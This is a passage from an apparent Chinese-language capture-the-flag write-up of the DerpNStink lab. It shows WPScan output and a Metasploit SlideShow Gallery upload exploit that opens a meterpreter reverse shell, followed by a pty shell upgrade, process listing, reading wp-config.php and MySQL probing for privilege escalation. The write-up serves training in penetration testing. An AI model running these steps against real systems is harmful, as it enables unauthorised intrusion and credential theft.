Enumerating Config Backups (via Passive and Aggressive Methods)<br> Checking Config Backups - Time: 00:00:00 &lt;===============&gt; (137 / 137) 100.00% Time: 00:00:00</p><p>[i] No Config Backups Found.</p><p>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at <a href="https://wpscan.com/register">https://wpscan.com/register</a></p><p>[+] Finished: Mon Jul 22 17:34:59 2024<br>[+] Requests Done: 182<br>[+] Cached Requests: 5<br>[+] Data Sent: 48.098 KB<br>[+] Data Received: 13.151 MB<br>[+] Memory used: 288.371 MB<br>[+] Elapsed time: 00:00:07<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">存在slideshow-gallery漏洞，我们用msf搜一下</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>┌──(kali㉿kali)-[~]<br>└─$ msfconsole<br>Metasploit tip: Use sessions -1 to interact with the last opened session</p><pre><code> ,           ,/             \</code></pre><p>   ((<strong>—-,,,—-</strong>))<br>      (<em>) O O (</em>)<strong><strong>_</strong></strong><br>         \ <em> /            |\<br>          o<em>o \   M S F   | \<br>               \   <em>_</em></em></em>  |  *<br>                |||   WW|||<br>                |||     |||</p><pre><code>   =[ metasploit v6.4.17-dev                          ]</code></pre><ul><li>— —=[ 2436 exploits - 1255 auxiliary - 429 post       ]</li><li>— —=[ 1468 payloads - 47 encoders - 11 nops           ]</li><li>— —=[ 9 evasion                                       ]</li></ul><p>Metasploit Documentation: <a href="https://docs.metasploit.com/">https://docs.metasploit.com/</a></p><p>msf6 &gt; search Slidehow Gallery<br>[-] No results from search<br>msf6 &gt; search slidehow<br>[-] No results from search<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">都没有，看另外一个wp说是有一个cve-2014-5406的，尝试利用</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>msf6 &gt; search CVE-2014-5460</p><h1 id="Matching-Modules"><a href="#Matching-Modules" class="headerlink" title="Matching Modules"></a>Matching Modules</h1><h1 id="Name-Disclosure-Date-Rank-Check-Description"><a href="#Name-Disclosure-Date-Rank-Check-Description" class="headerlink" title="Name                                            Disclosure Date  Rank       Check  Description"></a>Name                                            Disclosure Date  Rank       Check  Description</h1><hr><p>   0  exploit/unix/webapp/wp_slideshowgallery_upload  2014-08-28       excellent  Yes    Wordpress SlideShow Gallery Authenticated File Upload</p><p>Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_slideshowgallery_upload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>msf6 &gt; use 0<br>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set rhosts 192.168.159.136<br>rhosts =&gt; 192.168.159.136<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; show options</p><p>Module options (exploit/unix/webapp/wp_slideshowgallery_upload):</p><p>   Name         Current Setting  Required  Description</p><hr><p>   Proxies                       no        A proxy chain of format type:host:port[,type:host<br>                                           :port][…]<br>   RHOSTS       192.168.159.136  yes       The target host(s), see <a href="https://docs.metasploit.c">https://docs.metasploit.c</a><br>                                           om/docs/using-metasploit/basics/using-metasploit.<br>                                           html<br>   RPORT        80               yes       The target port (TCP)<br>   SSL          false            no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI    /                yes       The base path to the wordpress application<br>   VHOST                         no        HTTP server virtual host<br>   WP_PASSWORD                   yes       Valid password for the provided username<br>   WP_USER                       yes       A valid username</p><p>Payload options (php/meterpreter/reverse_tcp):</p><p>   Name   Current Setting  Required  Description</p><hr><p>   LHOST  192.168.159.129  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port</p><p>Exploit target:</p><p>   Id  Name</p><hr><p>   0   WP SlideShow Gallery 1.4.6</p><p>View the full module info with the info, or info -d command.</p><p>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set wp_user admin<br>wp_user =&gt; admin<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; ser WP_PASSWORD admin<br>[-] Unknown command: ser. Did you mean set? Run the help command for more details.<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; show option<br>[-] Invalid parameter “option”, use “show -h” for more information<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; show options</p><p>Module options (exploit/unix/webapp/wp_slideshowgallery_upload):</p><p>   Name         Current Setting  Required  Description</p><hr><p>   Proxies                       no        A proxy chain of format type:host:port[,type:host<br>                                           :port][…]<br>   RHOSTS       192.168.159.136  yes       The target host(s), see <a href="https://docs.metasploit.c">https://docs.metasploit.c</a><br>                                           om/docs/using-metasploit/basics/using-metasploit.<br>                                           html<br>   RPORT        80               yes       The target port (TCP)<br>   SSL          false            no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI    /                yes       The base path to the wordpress application<br>   VHOST                         no        HTTP server virtual host<br>   WP_PASSWORD                   yes       Valid password for the provided username<br>   WP_USER      admin            yes       A valid username</p><p>Payload options (php/meterpreter/reverse_tcp):</p><p>   Name   Current Setting  Required  Description</p><hr><p>   LHOST  192.168.159.129  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port</p><p>Exploit target:</p><p>   Id  Name</p><hr><p>   0   WP SlideShow Gallery 1.4.6</p><p>View the full module info with the info, or info -d command.</p><p>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set wp_password admin<br>wp_password =&gt; admin<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set targeturl /weblog<br>[!] Unknown datastore option: targeturl. Did you mean TARGET?<br>targeturl =&gt; /weblog<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set vhost derpanstink.local<br>vhost =&gt; derpanstink.local<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set vhost derpnstink.local<br>vhost =&gt; derpnstink.local<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set targeturl /weblog/<br>targeturl =&gt; /weblog/<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; show options</p><p>Module options (exploit/unix/webapp/wp_slideshowgallery_upload):</p><p>   Name         Current Setting   Required  Description</p><hr><p>   Proxies                        no        A proxy chain of format type:host:port[,type:hos<br>                                            t:port][…]<br>   RHOSTS       192.168.159.136   yes       The target host(s), see <a href="https://docs.metasploit">https://docs.metasploit</a>.<br>                                            com/docs/using-metasploit/basics/using-metasploi<br>                                            t.html<br>   RPORT        80                yes       The target port (TCP)<br>   SSL          false             no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI    /                 yes       The base path to the wordpress application<br>   VHOST        derpnstink.local  no        HTTP server virtual host<br>   WP_PASSWORD  admin             yes       Valid password for the provided username<br>   WP_USER      admin             yes       A valid username</p><p>Payload options (php/meterpreter/reverse_tcp):</p><p>   Name   Current Setting  Required  Description</p><hr><p>   LHOST  192.168.159.129  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port</p><p>Exploit target:</p><p>   Id  Name</p><hr><p>   0   WP SlideShow Gallery 1.4.6</p><p>View the full module info with the info, or info -d command.</p><p>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set TARGETURL /weblog/<br>TARGETURL =&gt; /weblog/<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; SHOW OPTIONS<br>[-] Unknown command: SHOW. Did you mean show? Run the help command for more details.<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; show options</p><p>Module options (exploit/unix/webapp/wp_slideshowgallery_upload):</p><p>   Name         Current Setting   Required  Description</p><hr><p>   Proxies                        no        A proxy chain of format type:host:port[,type:hos<br>                                            t:port][…]<br>   RHOSTS       192.168.159.136   yes       The target host(s), see <a href="https://docs.metasploit">https://docs.metasploit</a>.<br>                                            com/docs/using-metasploit/basics/using-metasploi<br>                                            t.html<br>   RPORT        80                yes       The target port (TCP)<br>   SSL          false             no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI    /                 yes       The base path to the wordpress application<br>   VHOST        derpnstink.local  no        HTTP server virtual host<br>   WP_PASSWORD  admin             yes       Valid password for the provided username<br>   WP_USER      admin             yes       A valid username</p><p>Payload options (php/meterpreter/reverse_tcp):</p><p>   Name   Current Setting  Required  Description</p><hr><p>   LHOST  192.168.159.129  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port</p><p>Exploit target:</p><p>   Id  Name</p><hr><p>   0   WP SlideShow Gallery 1.4.6</p><p>View the full module info with the info, or info -d command.</p><p>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set TARGETURI /weblog/<br>TARGETURI =&gt; /weblog/<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; show options</p><p>Module options (exploit/unix/webapp/wp_slideshowgallery_upload):</p><p>   Name         Current Setting   Required  Description</p><hr><p>   Proxies                        no        A proxy chain of format type:host:port[,type:hos<br>                                            t:port][…]<br>   RHOSTS       192.168.159.136   yes       The target host(s), see <a href="https://docs.metasploit">https://docs.metasploit</a>.<br>                                            com/docs/using-metasploit/basics/using-metasploi<br>                                            t.html<br>   RPORT        80                yes       The target port (TCP)<br>   SSL          false             no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI    /weblog/          yes       The base path to the wordpress application<br>   VHOST        derpnstink.local  no        HTTP server virtual host<br>   WP_PASSWORD  admin             yes       Valid password for the provided username<br>   WP_USER      admin             yes       A valid username</p><p>Payload options (php/meterpreter/reverse_tcp):</p><p>   Name   Current Setting  Required  Description</p><hr><p>   LHOST  192.168.159.129  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port</p><p>Exploit target:</p><p>   Id  Name</p><hr><p>   0   WP SlideShow Gallery 1.4.6</p><p>View the full module info with the info, or info -d command.</p><p>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; ruin<br>[-] Unknown command: ruin. Did you mean run? Run the help command for more details.<br>msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; run</p><p>[<em>] Started reverse TCP handler on 192.168.159.129:4444<br>[</em>] Trying to login as admin<br>[<em>] Trying to upload payload<br>[</em>] Uploading payload<br>[<em>] Calling uploaded file zpvaixmu.php<br>[</em>] Sending stage (39927 bytes) to 192.168.159.136<br>[+] Deleted zpvaixmu.php<br>[*] Meterpreter session 1 opened (192.168.159.129:4444 -&gt; 192.168.159.136:36512) at 2024-07-22 18:07:00 +0800</p><p>meterpreter &gt;<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">也是成功利用上了</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>shell</p><p>后面接上python -c ‘import pty; pty.spawn(“/bin/bash”)’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">正常的id和uname -a 看一下权限和系统结构</span><br><span class="line"></span><br><span class="line">后面提权</span><br><span class="line">看了一下正在运行的</span><br><span class="line">发现正在用root运行Mysql，所以可以尝试udf提权</span><br></pre></td></tr></table></figure><p>&lt;/html/weblog/wp-content/uploads/slideshow-gallery$ ps -ef<br>ps -ef<br>UID        PID  PPID  C STIME TTY          TIME CMD<br>root         1     0  0 03:40 ?        00:00:01 /sbin/init<br>root         2     0  0 03:40 ?        00:00:00 [kthreadd]<br>root         3     2  0 03:40 ?        00:00:02 [ksoftirqd/0]<br>root         4     2  0 03:40 ?        00:00:00 [kworker/0:0]<br>root         5     2  0 03:40 ?        00:00:00 [kworker/0:0H]<br>root         7     2  0 03:40 ?        00:00:00 [rcu_sched]<br>root         8     2  0 03:40 ?        00:00:00 [rcu_bh]<br>root         9     2  0 03:40 ?        00:00:00 [migration/0]<br>root        10     2  0 03:40 ?        00:00:00 [watchdog/0]<br>root        11     2  0 03:40 ?        00:00:00 [kdevtmpfs]<br>root        12     2  0 03:40 ?        00:00:00 [netns]<br>root        13     2  0 03:40 ?        00:00:00 [perf]<br>root        14     2  0 03:40 ?        00:00:00 [khungtaskd]<br>root        15     2  0 03:40 ?        00:00:00 [writeback]<br>root        16     2  0 03:40 ?        00:00:00 [ksmd]<br>root        17     2  0 03:40 ?        00:00:00 [khugepaged]<br>root        18     2  0 03:40 ?        00:00:00 [crypto]<br>root        19     2  0 03:40 ?        00:00:00 [kintegrityd]<br>root        20     2  0 03:40 ?        00:00:00 [bioset]<br>root        21     2  0 03:40 ?        00:00:00 [kblockd]<br>root        22     2  0 03:40 ?        00:00:00 [ata_sff]<br>root        23     2  0 03:40 ?        00:00:00 [md]<br>root        24     2  0 03:40 ?        00:00:00 [devfreq_wq]<br>root        28     2  0 03:40 ?        00:00:00 [kswapd0]<br>root        29     2  0 03:40 ?        00:00:00 [vmstat]<br>root        30     2  0 03:40 ?        00:00:00 [fsnotify_mark]<br>root        31     2  0 03:40 ?        00:00:00 [ecryptfs-kthrea]<br>root        47     2  0 03:40 ?        00:00:00 [kthrotld]<br>root        48     2  0 03:40 ?        00:00:00 [acpi_thermal_pm]<br>root        49     2  0 03:40 ?        00:00:00 [bioset]<br>root        50     2  0 03:40 ?        00:00:00 [bioset]<br>root        52     2  0 03:40 ?        00:00:00 [bioset]<br>root        53     2  0 03:40 ?        00:00:00 [bioset]<br>root        54     2  0 03:40 ?        00:00:00 [bioset]<br>root        55     2  0 03:40 ?        00:00:00 [bioset]<br>root        56     2  0 03:40 ?        00:00:00 [bioset]<br>root        57     2  0 03:40 ?        00:00:00 [bioset]<br>root        58     2  0 03:40 ?        00:00:00 [bioset]<br>root        59     2  0 03:40 ?        00:00:00 [bioset]<br>root        60     2  0 03:40 ?        00:00:00 [bioset]<br>root        61     2  0 03:40 ?        00:00:00 [bioset]<br>root        62     2  0 03:40 ?        00:00:00 [bioset]<br>root        63     2  0 03:40 ?        00:00:00 [bioset]<br>root        64     2  0 03:40 ?        00:00:00 [bioset]<br>root        65     2  0 03:40 ?        00:00:00 [bioset]<br>root        66     2  0 03:40 ?        00:00:00 [bioset]<br>root        67     2  0 03:40 ?        00:00:00 [bioset]<br>root        68     2  0 03:40 ?        00:00:00 [bioset]<br>root        69     2  0 03:40 ?        00:00:00 [bioset]<br>root        70     2  0 03:40 ?        00:00:00 [bioset]<br>root        71     2  0 03:40 ?        00:00:00 [bioset]<br>root        72     2  0 03:40 ?        00:00:00 [bioset]<br>root        73     2  0 03:40 ?        00:00:00 [bioset]<br>root        74     2  0 03:40 ?        00:00:00 [scsi_eh_0]<br>root        75     2  0 03:40 ?        00:00:00 [scsi_tmf_0]<br>root        76     2  0 03:40 ?        00:00:00 [scsi_eh_1]<br>root        77     2  0 03:40 ?        00:00:00 [scsi_tmf_1]<br>root        79     2  0 03:40 ?        00:00:00 [kworker/0:2]<br>root        80     2  0 03:40 ?        00:00:00 [ipv6_addrconf]<br>root        94     2  0 03:40 ?        00:00:00 [deferwq]<br>root        95     2  0 03:40 ?        00:00:00 [charger_manager]<br>root       149     2  0 03:40 ?        00:00:00 [scsi_eh_2]<br>root       150     2  0 03:40 ?        00:00:00 [scsi_tmf_2]<br>root       151     2  0 03:40 ?        00:00:00 [scsi_eh_3]<br>root       152     2  0 03:40 ?        00:00:00 [mpt_poll_0]<br>root       153     2  0 03:40 ?        00:00:00 [scsi_tmf_3]<br>root       154     2  0 03:40 ?        00:00:00 [mpt/0]<br>root       155     2  0 03:40 ?        00:00:00 [scsi_eh_4]<br>root       156     2  0 03:40 ?        00:00:00 [scsi_tmf_4]<br>root       157     2  0 03:40 ?        00:00:00 [scsi_eh_5]<br>root       158     2  0 03:40 ?        00:00:00 [scsi_tmf_5]<br>root       159     2  0 03:40 ?        00:00:00 [kpsmoused]<br>root       160     2  0 03:40 ?        00:00:00 [scsi_eh_6]<br>root       161     2  0 03:40 ?        00:00:00 [scsi_tmf_6]<br>root       162     2  0 03:40 ?        00:00:00 [scsi_eh_7]<br>root       163     2  0 03:40 ?        00:00:00 [scsi_tmf_7]<br>root       164     2  0 03:40 ?        00:00:00 [scsi_eh_8]<br>root       165     2  0 03:40 ?        00:00:00 [scsi_tmf_8]<br>root       166     2  0 03:40 ?        00:00:00 [scsi_eh_9]<br>root       167     2  0 03:40 ?        00:00:00 [scsi_tmf_9]<br>root       168     2  0 03:40 ?        00:00:00 [scsi_eh_10]<br>root       169     2  0 03:40 ?        00:00:00 [scsi_tmf_10]<br>root       170     2  0 03:40 ?        00:00:00 [scsi_eh_11]<br>root       171     2  0 03:40 ?        00:00:00 [scsi_tmf_11]<br>root       172     2  0 03:40 ?        00:00:00 [scsi_eh_12]<br>root       173     2  0 03:40 ?        00:00:00 [scsi_tmf_12]<br>root       174     2  0 03:40 ?        00:00:00 [scsi_eh_13]<br>root       175     2  0 03:40 ?        00:00:00 [scsi_tmf_13]<br>root       176     2  0 03:40 ?        00:00:00 [scsi_eh_14]<br>root       177     2  0 03:40 ?        00:00:00 [scsi_tmf_14]<br>root       178     2  0 03:40 ?        00:00:00 [scsi_eh_15]<br>root       179     2  0 03:40 ?        00:00:00 [scsi_tmf_15]<br>root       180     2  0 03:40 ?        00:00:00 [scsi_eh_16]<br>root       181     2  0 03:40 ?        00:00:00 [scsi_tmf_16]<br>root       182     2  0 03:40 ?        00:00:00 [scsi_eh_17]<br>root       183     2  0 03:40 ?        00:00:00 [scsi_tmf_17]<br>root       184     2  0 03:40 ?        00:00:00 [scsi_eh_18]<br>root       185     2  0 03:40 ?        00:00:00 [scsi_tmf_18]<br>root       186     2  0 03:40 ?        00:00:00 [scsi_eh_19]<br>root       187     2  0 03:40 ?        00:00:00 [scsi_tmf_19]<br>root       188     2  0 03:40 ?        00:00:00 [scsi_eh_20]<br>root       189     2  0 03:40 ?        00:00:00 [scsi_tmf_20]<br>root       190     2  0 03:40 ?        00:00:00 [scsi_eh_21]<br>root       191     2  0 03:40 ?        00:00:00 [scsi_tmf_21]<br>root       192     2  0 03:40 ?        00:00:00 [scsi_eh_22]<br>root       193     2  0 03:40 ?        00:00:00 [scsi_tmf_22]<br>root       194     2  0 03:40 ?        00:00:00 [scsi_eh_23]<br>root       195     2  0 03:40 ?        00:00:00 [scsi_tmf_23]<br>root       196     2  0 03:40 ?        00:00:00 [scsi_eh_24]<br>root       197     2  0 03:40 ?        00:00:00 [scsi_tmf_24]<br>root       198     2  0 03:40 ?        00:00:00 [scsi_eh_25]<br>root       199     2  0 03:40 ?        00:00:00 [scsi_tmf_25]<br>root       200     2  0 03:40 ?        00:00:00 [scsi_eh_26]<br>root       201     2  0 03:40 ?        00:00:00 [scsi_tmf_26]<br>root       202     2  0 03:40 ?        00:00:00 [scsi_eh_27]<br>root       203     2  0 03:40 ?        00:00:00 [scsi_tmf_27]<br>root       204     2  0 03:40 ?        00:00:00 [scsi_eh_28]<br>root       205     2  0 03:40 ?        00:00:00 [scsi_tmf_28]<br>root       206     2  0 03:40 ?        00:00:00 [scsi_eh_29]<br>root       207     2  0 03:40 ?        00:00:00 [scsi_tmf_29]<br>root       208     2  0 03:40 ?        00:00:00 [scsi_eh_30]<br>root       209     2  0 03:40 ?        00:00:00 [scsi_tmf_30]<br>root       210     2  0 03:40 ?        00:00:00 [scsi_eh_31]<br>root       211     2  0 03:40 ?        00:00:00 [scsi_tmf_31]<br>root       236     2  0 03:40 ?        00:00:00 [kworker/u16:29]<br>root       239     2  0 03:40 ?        00:00:00 [scsi_eh_32]<br>root       240     2  0 03:40 ?        00:00:00 [scsi_tmf_32]<br>root       241     2  0 03:40 ?        00:00:00 [bioset]<br>root       259     2  0 03:40 ?        00:00:00 [bioset]<br>root       264     2  0 03:40 ?        00:00:00 [kworker/0:1H]<br>root       273     2  0 03:40 ?        00:00:00 [jbd2/sda1-8]<br>root       274     2  0 03:40 ?        00:00:00 [ext4-rsv-conver]<br>root       410     1  0 03:40 ?        00:00:00 upstart-udev-bridge —daemon<br>root       419     1  0 03:40 ?        00:00:00 /lib/systemd/systemd-udevd —dae<br>message+   488     1  0 03:40 ?        00:00:00 dbus-daemon —system —fork<br>root       564     1  0 03:40 ?        00:00:00 /lib/systemd/systemd-logind<br>root       565     1  0 03:40 ?        00:00:00 /usr/sbin/bluetoothd<br>syslog     580     1  0 03:40 ?        00:00:00 rsyslogd<br>root       581     2  0 03:40 ?        00:00:00 [krfcommd]<br>root       589     1  0 03:40 ?        00:00:00 /usr/sbin/cupsd -f<br>avahi      592     1  0 03:40 ?        00:00:00 avahi-daemon: running [DeRPnStiN<br>avahi      593   592  0 03:40 ?        00:00:00 avahi-daemon: chroot helper<br>root       623     2  0 03:40 ?        00:00:00 [ttm_swap]<br>root       627     1  0 03:40 ?        00:00:00 upstart-file-bridge —daemon<br>root       753     1  0 03:40 ?        00:00:00 /usr/sbin/ModemManager<br>root       771     1  0 03:40 ?        00:00:01 NetworkManager<br>root       775     1  0 03:40 ?        00:00:00 /usr/sbin/cups-browsed<br>root       782     1  0 03:40 ?        00:00:00 /usr/lib/policykit-1/polkitd —n<br>root       822     1  0 03:40 ?        00:00:00 upstart-socket-bridge —daemon<br>root       824   771  0 03:40 ?        00:00:00 /sbin/dhclient -d -sf /usr/lib/N<br>root       976     1  0 03:40 tty4     00:00:00 /sbin/getty -8 38400 tty4<br>root       980     1  0 03:40 tty5     00:00:00 /sbin/getty -8 38400 tty5<br>root       987     1  0 03:40 tty2     00:00:00 /sbin/getty -8 38400 tty2<br>root       988     1  0 03:40 tty3     00:00:00 /sbin/getty -8 38400 tty3<br>root       992     1  0 03:40 tty6     00:00:00 /sbin/getty -8 38400 tty6<br>root      1055     1  0 03:40 ?        00:00:00 /usr/sbin/sshd -D<br>root      1057     1  0 03:40 ?        00:00:00 cron<br>root      1059     1  0 03:40 ?        00:00:00 /usr/sbin/vsftpd<br>whoopsie  1067     1  0 03:40 ?        00:00:00 whoopsie<br>root      1076     1  0 03:40 ?        00:00:00 acpid -c /etc/acpi/events -s /va<br>kernoops  1105     1  0 03:40 ?        00:00:00 /usr/sbin/kerneloops<br>mysql     1113     1  0 03:40 ?        00:00:04 /usr/sbin/mysqld<br>root      1144     1  0 03:40 ?        00:00:07 /usr/bin/vmtoolsd<br>root      1179     1  0 03:40 ?        00:00:00 lightdm<br>root      1217  1179  0 03:40 tty7     00:00:00 /usr/lib/xorg/Xorg -core :0 -sea<br>root      1220     1  0 03:40 ?        00:00:00 /usr/lib/accountsservice/account<br>root      1255     1  0 03:40 ?        00:00:00 /usr/sbin/apache2 -k start<br>nobody    1271   771  0 03:40 ?        00:00:00 /usr/sbin/dnsmasq —no-resolv —<br>root      1277  1179  0 03:40 ?        00:00:00 lightdm —session-child 16 19<br>root      1286     2  0 03:40 ?        00:00:00 [kauditd]<br>lightdm   1291  1277  0 03:40 ?        00:00:00 /bin/sh /usr/lib/lightdm/lightdm<br>lightdm   1296     1  0 03:40 ?        00:00:00 //bin/dbus-daemon —fork —print<br>lightdm   1297  1291  0 03:40 ?        00:00:00 /usr/sbin/unity-greeter<br>lightdm   1299     1  0 03:40 ?        00:00:00 /usr/lib/at-spi2-core/at-spi-bus<br>lightdm   1334  1299  0 03:40 ?        00:00:00 /bin/dbus-daemon —config-file=/<br>lightdm   1345     1  0 03:40 ?        00:00:00 /usr/lib/at-spi2-core/at-spi2-re<br>lightdm   1369     1  0 03:40 ?        00:00:00 /usr/lib/gvfs/gvfsd<br>lightdm   1378     1  0 03:40 ?        00:00:00 /usr/lib/gvfs/gvfsd-fuse /run/us<br>lightdm   1467     1  0 03:40 ?        00:00:00 /usr/lib/dconf/dconf-service<br>root      1478  1179  0 03:40 ?        00:00:00 lightdm —session-child 12 19<br>lightdm   1481     1  0 03:40 ?        00:00:00 init —user —startup-event indi<br>lightdm   1483     1  0 03:40 ?        00:00:00 nm-applet<br>lightdm   1486     1  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato<br>lightdm   1488  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato<br>lightdm   1491  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato<br>lightdm   1494     1  0 03:40 ?        00:00:00 /usr/lib/unity-settings-daemon/u<br>lightdm   1496  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato<br>lightdm   1499  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato<br>lightdm   1511  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato<br>root      1529     1  0 03:40 tty1     00:00:00 /sbin/getty -8 38400 tty1<br>root      1532     1  0 03:40 ?        00:00:00 /usr/lib/upower/upowerd<br>lightdm   1534  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato<br>lightdm   1538  1481  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/indicato<br>lightdm   1571  1481  0 03:40 ?        00:00:00 /usr/bin/pulseaudio —start —lo<br>rtkit     1573     1  0 03:40 ?        00:00:00 /usr/lib/rtkit/rtkit-daemon<br>lightdm   1600     1  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/notify-o<br>lightdm   1854     1  0 03:40 ?        00:00:00 /usr/lib/i386-linux-gnu/gconf/gc<br>colord    1872     1  0 03:40 ?        00:00:00 /usr/lib/colord/colord<br>www-data  1968  1255  0 03:47 ?        00:00:21 /usr/sbin/apache2 -k start<br>www-data  2025  1255  0 03:57 ?        00:00:19 /usr/sbin/apache2 -k start<br>www-data  2029  1255  0 03:57 ?        00:00:18 /usr/sbin/apache2 -k start<br>www-data  2031  1255  0 03:57 ?        00:00:16 /usr/sbin/apache2 -k start<br>www-data  2035  1255  0 03:57 ?        00:00:19 /usr/sbin/apache2 -k start<br>www-data  2067  1255  0 04:37 ?        00:00:09 /usr/sbin/apache2 -k start<br>www-data  2080  1255  0 04:41 ?        00:00:10 /usr/sbin/apache2 -k start<br>www-data  2081  1255  0 04:41 ?        00:00:10 /usr/sbin/apache2 -k start<br>www-data  2082  1255  0 04:41 ?        00:00:10 /usr/sbin/apache2 -k start<br>root      2083     2  0 04:42 ?        00:00:00 [kworker/u16:0]<br>www-data  2084  1255  0 04:45 ?        00:00:00 /usr/sbin/apache2 -k start<br>www-data  2142  2031  0 06:07 ?        00:00:00 sh -c /bin/sh<br>www-data  2143  2142  0 06:07 ?        00:00:00 /bin/sh<br>www-data  2144  2143  0 06:07 ?        00:00:00 python -c import pty; pty.spawn(<br>www-data  2145  2144  0 06:07 pts/1    00:00:00 /bin/bash<br>www-data  2150  2145  0 06:08 pts/1    00:00:00 ps -ef<br>&lt;/html/weblog/wp-content/uploads/slideshow-gallery$ ls<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">配置文件中发现了mysql的账号密码</span><br></pre></td></tr></table></figure><br>&lt;/html/weblog/wp-content/uploads/slideshow-gallery$ cd /var/www/html/<br>cd /var/www/html/<br>www-data@DeRPnStiNK:/var/www/html$ ls<br>ls<br>css       index.html  php         stinky.png  weblog<br>derp.png  js          robots.txt  temporary   webnotes<br>www-data@DeRPnStiNK:/var/www/html$ cd weblog<br>cd weblog<br>www-data@DeRPnStiNK:/var/www/html/weblog$ ls<br>ls<br>index.php        wp-blog-header.php    wp-cron.php        wp-mail.php<br>license.txt      wp-comments-post.php  wp-includes        wp-settings.php<br>readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php<br>wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php<br>wp-admin         wp-content            wp-login.php       xmlrpc.php<br>www-data@DeRPnStiNK:/var/www/html/weblog$ cat wp-config.php<br>cat wp-config.php<br>&lt;?php<br>/**</p><ul><li>The base configuration for WordPress<br>*</li><li>The wp-config.php creation script uses this file during the</li><li>installation. You don’t have to use the web site, you can</li><li>copy this file to “wp-config.php” and fill in the values.<br>*</li><li>This file contains the following configurations:<br>*</li><li><ul><li>MySQL settings</li></ul></li><li><ul><li>Secret keys</li></ul></li><li><ul><li>Database table prefix</li></ul></li><li><ul><li>ABSPATH<br>*</li></ul></li><li>@link <a href="https://codex.wordpress.org/Editing_wp-config.php">https://codex.wordpress.org/Editing_wp-config.php</a><br>*</li><li>@package WordPress<br>*/</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看发现不可以任意上传下载文件，只能在指定目录下上传下载文件，不可以使用udf</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.</p><p>mysql&gt; show global variables like ‘secure%’;<br>show global variables like ‘secure%’;<br>+—————————+———————————-+<br>| Variable_name    | Value                 |<br>+—————————+———————————-+<br>| secure_auth      | OFF                   |<br>| secure_file_priv | /var/lib/mysql-files/ |<br>+—————————+———————————-+<br>2 rows in set (0.00 sec)</p><p>mysql&gt;<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">之前不是发现一个phpmyadmin，我们用账号密码登录 进去，在里面的wp-posts发现flag2</span><br><span class="line"></span><br><span class="line">在wp_users表中发现另一个用户unclestinky</span><br><span 